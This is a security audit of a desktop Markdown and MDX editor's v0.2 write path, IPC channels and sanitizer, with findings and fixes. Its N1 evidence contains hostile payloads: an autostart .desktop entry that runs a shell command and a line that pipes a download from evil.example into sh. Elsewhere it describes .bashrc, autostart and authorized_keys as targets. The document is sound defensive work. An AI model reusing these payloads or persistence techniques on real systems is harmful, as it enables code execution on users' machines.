> Published copy of the v0.2 security audit, as written on 2026-10-10 against the commit named below.
> Findings, evidence and verdicts are unchanged. Names and identifiers follow the app's current name,
> file and line references point into the audited commit, and "Status after fixes" records
> what became of each finding. Security requirements (SR-xx) and threats (Tn) are defined in the
> [threat model](../threat-model.md).

- **Commit audited**: `dcf1c77` (main, clean tree). The delta is `v0.1.0..dcf1c77`: 47 commits, 129 files.
- **Scope**:
  - the write path: `documents.save`, `dirty`, `leaveEdit`, `closeAnswer`, `keep` and `recover`;
  - the `saveFile` adapter;
  - edit grants;
  - the crash mirror of unsaved text (SR-16);
  - the close and quit round trip;
  - the MDX pipeline;
  - the `@codemirror/merge` diff view;

  nested copies of the new dependencies. Controls that the delta does not touch carry over from
  the [v0.1 audit](2026-10-07-v0.1.md) and are not re-audited here.

## Attack surface map (delta since v0.1.0)

Entry points that are new or have changed:

- **B3, IPC.** Six new request channels, each with a zod tuple schema in `src/shared/contracts/schemas.ts`:
  - `documents.save [id, text ≤ 256 Mi, version|null]`
  - `documents.dirty`
  - `documents.leaveEdit`
  - `documents.closeAnswer ['asking'|'proceed'|'cancel']`
  - `documents.keep [id, text, version|null]`
  - `documents.recover`

  Two new main→page events: `documents.editMode` and `documents.confirmClose`.

  `tabViewState` gains `view: 'split'` and `ratio`.

  All of these go through the unchanged `registerIpc` sender check (`src/main/ipc/handle.ts`).
- **B3→B4, disk writes (new).**
  - `documents.save` → `saveDocument` (`src/core/documents/save.ts`) → `NodeFileSystem.saveFile`
    (`src/main/adapters/file-system.ts`).
  - The write is gated on an edit grant and an input credit, as described in ADR-013.
- **B1/B3, capability key.** Ctrl+E is taken in main's `before-input-event`. `mainKey` → `toggleEditMode` grants
  edit mode to **main's active tab of the window** (`src/main/index.ts:305`).
  - `window.command` still accepts only `WINDOW_COMMANDS`, so `editMode` cannot be sent by the page
    (`schemas.ts:106`).
- **B5, document content.**
  - MDX (`.mdx`) is parsed with `remark-mdx` (acorn parse, never evaluated) through the same `articleParser` that
    main's link extraction uses (`src/shared/markdown/parser.ts`).
  - Split view adds live renders of the editor's unsaved text. These go through the same worker and sanitizer,
    with `noCache`.
- **In memory, main (new).** Main holds each dirty tab's unsaved text (`EditGrants.kept`) for crash recovery.
- **Renderer only.**
  - The `@codemirror/merge` diff view (read-only).
  - Literal find and replace in CodeMirror.
  - Multiple cursors.

## Per-SR verification (SRs the delta touches)

### SR-01 Hardened renderers — **PASS (unchanged)**

- The delta does not touch `policy.ts`, `factory.ts` or `harden.ts`.
- The window suite in `tests/e2e/security/` passed (see Test evidence).
- v0.1's F6 is closed: `44fef9c` adds the e2e test showing that a forwarded `--no-sandbox` leaves the instance
  sandboxed.

### SR-02 Content is inert (MDX) — **PASS**

- **Control**:
  - `src/shared/markdown/mdx.ts`:
    - `mdxjsEsm` is dropped.
    - Components become boxes: name, props and children, with the props and expressions as **text** nodes.
    - Expressions become `<code>` text.
    - A lowercase tag whose props are all strings becomes the same raw HTML as Markdown inline HTML. The tag name
      must match `^[a-z][a-z0-9-]*$`, and values are escaped for `&` and `"`.
  - Everything is built before `rehype-raw` → `rehype-sanitize`, so the v0.1 schema applies unchanged.
  - The schema adds only `dataGaleoMdx` on `div`, `span`, `code`, `pre` and `dl` (`sanitize-schema.ts`). It is a
    text-only attribute.
  - There is no new `innerHTML` sink. The only one is still `host.ts:40`, behind the `galeo-document` policy.
  - `remark-mdx` loads lazily in the worker. It parses with acorn and never evaluates.
- **Parity**: `references.ts` (main's worker) and `render.ts` (the page's worker) both call
  `articleParser({ mdx: remarkMdx })`. An MDX syntax error fails main's extraction, so no link is followed until the
  file parses (`links.ts` `extract`).
- **Proof**:
  - `tests/fixtures/payloads/mdx.payloads.mdx`: script, `onerror`, `javascript:`, a quote break-out in a prop,
    `dangerouslySetInnerHTML`, spread handlers, expressions, iframe, `style` URLs, remote images, svg/math, and
    base/link/meta. It is run as MDX by `tests/renderer/sanitizer-corpus.test.ts`.
  - `tests/e2e/mdx.spec.ts` ("runs nothing")
  - no-network MDX case
  - All passed.

### SR-11 Minimal, validated IPC — **PASS**

- Every new channel has a schema, and `api.test.ts` / `schemas.test.ts` were updated.
- The preload still exposes one fixed method per channel.
- `documents.editMode` and `documents.confirmClose` are events only. The page cannot send them.
- `documents.closeAnswer` is not scoped by tab, but by sender window (`unsaved.answer(event.sender.id, …)`).
- `documents.keep`, `recover`, `dirty` and `leaveEdit` act only on a grant whose `window === sender`
  (`edit-grants.ts`).
- Rejections are logged as `invalid arguments` with no argument values (`handle.ts`), so unsaved text never reaches
  the log.

### SR-12 Capability-scoped file access — **FAIL (write side) → N1, N2**

- **Read side**: unchanged and PASS. v0.1's F1 and F5 are fixed (see above and below).
- **Write side, control**:
  - `documents.save` requires all of the following (`src/main/documents/handlers.ts:96-110`):
    - a record in the sender's window;
    - `grants.allows(id, window, record.path)`;
    - `input.spend(window)`.
  - Grants are created only by `toggleEditMode`, from Ctrl+E or the menu that main sees.
  - `grants.sync` drops a grant when its tab closes or shows another path, so navigating a granted tab elsewhere
    loses the grant.
  - Grants are never written to the session.
- **What fails**:
  - The grant goes to `documents.snapshot(window).active`. The page sets that with `tabs.activated`, with no input
    and no other check (`src/main/tabs/handlers.ts:51`).
  - Main grants any non-settings tab, whatever its read state.

  So a compromised page decides *which* file the reader's Ctrl+E unlocks, including one that does not exist yet.
  SR-12 says "the renderer cannot enable editing by itself". That holds literally, but not in intent. See N1.
- **Proof that exists**:
  - `tests/unit/main/document-handlers.test.ts:160-236`: not editable, no input, own window only.
  - `tests/e2e/capabilities.spec.ts:13`: main takes Ctrl+E.
  - There is no e2e test of a page-originated `documents.save` (folded into N1's remediation).

### SR-14 Bounded work — **PASS**

- **MDX**: the render worker keeps its 2 s and 60 s `terminate()` budgets, and main's extraction keeps its 2 s

- **Live preview**: renders skip the cache and keep only the latest text (`client.ts`).
- **Replace**: `SearchQuery({ literal: true })` everywhere (`source-view.ts:191,217,231`), so there is no
  user-supplied regex and no ReDoS.
- **Proof**:
  - `tests/e2e/pathological.spec.ts`
  - `tests/perf/split-typing.spec.ts` (budget in `tests/perf/budgets.json`)
  - `tests/renderer/pipeline.test.ts`

### SR-15 Safe saves — **PASS** (N4 hardening; I2, I3 noted)

- **Control**:
  - `saveDocument` reads the file under the read cap, hashes it with SHA-256 and compares the hash with `base`. On
    a mismatch it returns `conflict` and writes nothing.
  - With a null `base`, it writes only if the file is still missing. The documented TOCTOU between this check and
    the write is accepted in SR-15.
  - Encoding:
    - the encoding of record, BOM and line endings are kept;
    - lone surrogates and characters Windows-1252 cannot hold refuse the save, naming the character and its line
      (`encode.ts`).
  - `saveFile`:
    - `realpath`, so a symlink is written through and stays a link;
    - regular files only;
    - `access(W_OK)` before anything, so a read-only file is not replaced through a writable folder;
    - temp file `.<name>.<uuid>.tmp` opened `wx` (O_EXCL, no symlink follow);
    - `chmod` to the old mode;
    - `chown` to the old owner and group, or a fallback to in place if that fails;
    - `fsync`, `rename`, then `fsync` of the folder;
    - in place (`open(real, 'w')`) when `nlink > 1` or the owner cannot be kept.
  - After a save, main records the new identity before the watcher fires.
- **Proof**:
  - `src/main/adapters/file-system.test.ts:278-372`: replaced, symlink, hard link in place, created, EACCES for a
    file and for a folder, EISDIR.
  - `tests/unit/core/save-document.test.ts`
  - `tests/e2e/edit.spec.ts`: conflict bar, deleted-file Save again, symlink, read-only file at `:349`.
  - All passed.

### SR-16 Local metadata hygiene (crash mirror) — **PASS**

- **Control**:
  - `EditGrants.keep` holds `{ text, base }` in a `Map` in main's memory. It is dropped on clean
    (`setDirty(false)`), leave, close or navigation (`sync`), and when the window closes.
  - `dropClean` keeps only grants with kept text across a renderer crash.
  - `recover` answers only to the same window.
  - A grep of `src/` finds no use of `localStorage`, `sessionStorage` or IndexedDB.
  - Main's warnings never include text.
  - The session schemas reject document text (v0.1).
- **Proof**:
  - `tests/e2e/edit.spec.ts:171` ("unsaved text never reaches a state file, while main holds it for a crash")
  - `tests/unit/core/edit-grants.test.ts`
  - Both passed.

## Findings

### N1 — High — A compromised page chooses which tab the reader's Ctrl+E puts in edit mode, then writes it: any file it can reach, or a new one

- **Location**:
  - `src/main/index.ts:305-313` `toggleEditMode`: it grants `documents.snapshot(window).active`.
  - `src/main/tabs/handlers.ts:51` `tabs.activated`: the page sets that active tab at will.
  - `src/main/documents/handlers.ts:96-110` `documents.save`.
  - `src/core/documents/save.ts`: a null `base` creates a missing file.
- **Vulnerability**: main honours Ctrl+E as the reader's intent, but applies it to whichever tab the page last said
  was active. A compromised page can open the target as a background tab in either of two ways:
  - follow a document link, spending one credit from any key press;
  - forge a drop grant. This needs no credit, and is the accepted T6 residual for *reads*.

  The page then marks the target active and waits for Ctrl+E. With the grant in hand, it spends the credit of the
  reader's next key press on `documents.save` with text of its choosing.

  Main grants tabs whose file does not exist (N2), and `saveDocument` creates a missing file when `base` is null. So
  the target can also be a file that does not exist yet.
- **Exploit scenario**: this needs script in the renderer first (T1: a Chromium/V8 bug or a sanitizer bypass). The
  hostile `notes.md` sits in `~/Downloads/repo/docs/`. It links `../../../.bashrc`, or
  `../../../.config/autostart/update.desktop`. A forged drop needs no link at all. The attack runs in seven steps:

  1. The page spends one credit from the reader's first click to `followLink(A, '<target>', 'background')`. The
     target tab B opens unseen.
  2. On the reader's next `keydown` of **Control** alone, the page sends `tabs.activated(B)`. The page sees this
     keydown, because main takes only Ctrl+E.
  3. Main receives `E` a few tens of milliseconds later and grants B.
  4. The page sends `tabs.activated(A)` back. The only sign is a flicker of the title bar.
  5. For `.bashrc`, the page calls `documents.read(B)` for its `version`. For the autostart file, `base` is null.
  6. On the reader's next key press, the page calls `documents.save(B, payload, version|null)`.
  7. The payload runs at the next shell or login. That is code execution outside the sandbox, which SR-01 exists to
     prevent.
- **Evidence**: a throwaway Playwright probe was run headless and then deleted. It drove the real app with
  `page.evaluate` for the page and main-side `sendInputEvent` for the reader's Ctrl+E.
  - Setup: `notes.md` links `victim.sh` (content `echo safe`) and `autostart/evil.desktop` (missing).
  - `followLink(…, 'background')` ×2, each after a click: both returned `{kind:'opened'}`.
  - `tabs.activated(C = evil.desktop)` with no input. Main's window title became `evil.desktop — default — galeo`.
  - A click, then Ctrl+E: the `documents.editMode {id: C, edit: 'granted'}` event fired.
  - `documents.save(C, '[Desktop Entry]…Exec=sh -c "touch /tmp/pwned"', null)` returned `{kind:'saved'}`, and
    `autostart/evil.desktop` was **created** with that text.
  - The same steps on B (`victim.sh`) with the `version` from `documents.read` returned `{kind:'saved'}`, and the
    file now reads `curl https://evil.example/x | sh`.
  - Not probed: the Control-keydown timing in step 2. The probe held B or C active for the whole press, so the
    title showed the target until the probe switched back.
- **Why High**:
  - v0.1's F1 had the same precondition (T1) and was Medium, for slow, visible exfiltration.
  - This one yields persistent code execution after one ordinary reader action in v0.2 (Ctrl+E). It defeats the
    sandbox, the containment that T1 is otherwise left to.
  - The owner may weigh the T1 precondition differently ("Questions raised", 1).
- **Remediation** (in order of cost):
  1. **Main decides editability (closes the "create a file" half; N2).**
     - In `toggleEditMode`, grant only when main's last read of that tab, at that path, was text with content.
     - `reads.shapeOf(tab.id, tab.path) !== null` already means exactly that: a shape is recorded only for a
       decoded, non-empty text read.
     - A file deleted after such a read keeps its shape, so *Save again* still works.
     - Missing, empty, binary, too-large and not-a-file tabs are then refused by main. The page message stays as
       UX.
  2. **Bind the grant to what the reader can verify.** The page controls everything inside the window, so only
     main-owned surfaces count. Options, which can be combined:
     - **(a)** Honour Ctrl+E only for a tab that has been main's active tab for at least about 1 s (record the time
       in `tabs.activated`). The title bar, which main draws, must then show the target's name for that second
       before the press. This defeats the Control-keydown race.
     - **(b)** While any tab in the window holds a grant, have main put the granted file in the title, for example
       `✎ victim.sh — …`, or list it in the native File menu. A grant on a file other than the one shown is then
       visible after the fact too.
     - **(c)** Make tab activation itself spend a credit. This is weaker: the Control keydown earns one.
     - **(d)** Show a native confirmation from main when the file being granted is outside the folder of the window's
       first argv, drop or quick-open file. This is heavier on UX.

     I recommend 1 + 2(a) + 2(b): they are small, main-only and need no new dialog.
  3. **Tests**: an e2e test in which `page.evaluate` sends `documents.save` without a grant (`not-editable`) and
     without input (`no-input`), matching SR-12's AC wording. Also one in which `tabs.activated(other)` immediately
     before Ctrl+E does not grant `other`.
  4. **Threat model**: extend the T6 residual row and SR-12 to cover writes. State that a full renderer compromise
     can write to the file the reader puts in edit mode, and no other, once the steps above are in.

### N2 — Low — The "can't be edited" rule (missing, empty, binary, too large, not a file) is enforced only in the page

- **Location**: `src/renderer/document/DocumentPane.tsx:297-301`, where the page calls `onLeaveEdit()` when the read
  is not `ready`. Main's `toggleEditMode` grants any non-settings tab.
- **Vulnerability**: ADR-013 says "Only a file with content can be edited … Ctrl+E says it can't be edited". Main
  does not check this, so a page that ignores the rule keeps the grant. On its own, this lets a compromised page
  write into an empty, binary or missing file the reader pressed Ctrl+E on.
- **Exploit scenario**: it is the enabler of N1's file-creation path (shown live there).
- **Remediation**: N1 step 1. Add a unit test in which `toggleEditMode` on a missing tab sends no `granted`.

### N3 — Low — A page can keep its window, and the app, from ever closing (close/quit round trip)

- **Location**: `src/core/documents/unsaved.ts`, `answer()` and `askOne()`; `src/main/index.ts` `window.on('close')`
  and `before-quit`.
- **Vulnerability**:
  - Once a page answers `asking`, the 5 s timer stops, and main waits for `proceed` or `cancel` with no limit. That
    is by design, so a reader can take their time.
  - Every retry (another close or quit) asks the same page again.
  - A compromised page that marks a granted tab dirty (`documents.dirty(id, true)`) and always answers `asking`, or
    a page hung after its acknowledgement, makes the window unclosable and the app unquittable short of `kill`.
  - A page that hangs before acknowledging fails safe: it is cancelled after 5 s, every time. The app still never
    quits while that window lives.
- **Exploit scenario**: needs T1 plus a grant. The result is a nuisance, not a security breach. The reader has to
  kill the process, and unsaved text is lost (it is held in main only).
- **Remediation**: on a second close or quit request for a window already asked, have main show its own native
  dialog: "galeo is waiting for you to choose in this window. Close it and lose its unsaved changes?" A main-owned
  "force" path keeps the page from holding the app hostage. Low priority.

### N4 — Low — The in-place save follows a symlink swapped in after `realpath`

- **Location**: `src/main/adapters/file-system.ts` `saveFile`, the in-place branch: `open(real, 'w')`.
- **Vulnerability**:
  - `real` is resolved once. The atomic branch is safe: the temp file is opened `wx`, and `rename` does not follow
    symlinks.
  - The in-place branch (a hard-linked file, or one owned by another user) opens `real` with `O_TRUNC` and follows
    a symlink.
- **Exploit scenario**: another user with write access to the folder, such as a shared group project directory,
  swaps the file for a symlink to the victim's `~/.ssh/authorized_keys` between `realpath` and `open`. The victim's
  save then truncates that file and writes the document's text into it. The attacker cannot choose the content, so
  the result is mostly destruction. `fs.protected_symlinks` does not apply outside sticky world-writable folders.
  Same-user processes are T11, which is accepted.
- **Remediation**: open with `constants.O_WRONLY | constants.O_TRUNC | constants.O_NOFOLLOW`. `real` is already
  resolved, so a link there now means it was swapped: refuse. Optionally, `fstat` the handle and compare `dev:ino`
  with `info` before writing.

### I2 — Info — The save and keep caps count UTF-16 code units, not bytes

- `schemas.ts`: `z.string().max(READ_MAX_BYTES)` allows 256 Mi *characters*. Encoded, that is up to about 768 MiB
  in UTF-8, or 1 GiB in UTF-32.
- Effects:
  - A file saved larger than 256 MiB can no longer be read (`too-large`). It also can't be saved again, because
    `saveDocument`'s first read fails with `ETOOBIG` → `failed: unavailable`.
  - `documents.keep` lets one window park up to 256 Mi characters per granted tab in main's heap.
- No security impact beyond memory pressure from a compromised page that already holds a grant.
- Optional: check `encoded.bytes.byteLength <= READ_MAX_BYTES` in `saveDocument`, and refuse it as a new
  `too-large` result.

### I3 — Info — A crash mid-save leaves `.<name>.<uuid>.tmp` beside the file

- It holds the document text, with the file's mode and owner, in the file's own folder. It is not a disclosure: same
  folder, same permissions. But it is clutter that version control may pick up.
- Optional: sweep `.<name>.*.tmp` siblings that are older than a minute on the next save of that file.

## Questions raised, and what was decided

1. **N1 severity and fix shape.**
   - Do you accept High, given the T1 precondition?
   - Which of steps 2(a)–(d) do you want?
   - Step 2 changes how the ADR-013 grant is bound ("the active tab" becomes "the tab that has been visibly active
     for a moment"). By convention that would be a new ADR superseding the clause, or a threat-model and SR-12
     update only?
   - *Decided*: High accepted; a new ADR (ADR-015) with a different fix shape: main grants edit mode only for read
     text, and files the reader didn't hand over ask in main's own dialog (see "Status").
2. **T6 residual wording.** Forged drop grants were accepted for *reads* ("exfiltration stays blocked"). With v0.2
   the same forgery feeds the write path. Even after N1 is fixed, a compromised page can write to the one file the
   reader deliberately puts in edit mode. Accept that explicitly as the new residual? *Decided*: accepted, and
   the threat model's T6 residual says so.
3. **SR-05 extensions.** Were `.deb`, `.rpm`, `.py` and `.pyz` left out of `LAUNCHERS` deliberately? *Outcome*:
   they were added.
4. **Not audited** (out of scope or not reachable statically):
   - the macOS and Windows preview builds (ADR-011);
   - a live re-run of `verify:package` on this commit (CI covers it);
   - the Control-keydown timing variant of N1 (reasoned, not probed);
   - `@codemirror/merge` internals beyond confirming it is read-only and renders under the enforced Trusted Types CSP in `edit.spec` "Show diff" (it is
     maintained upstream).
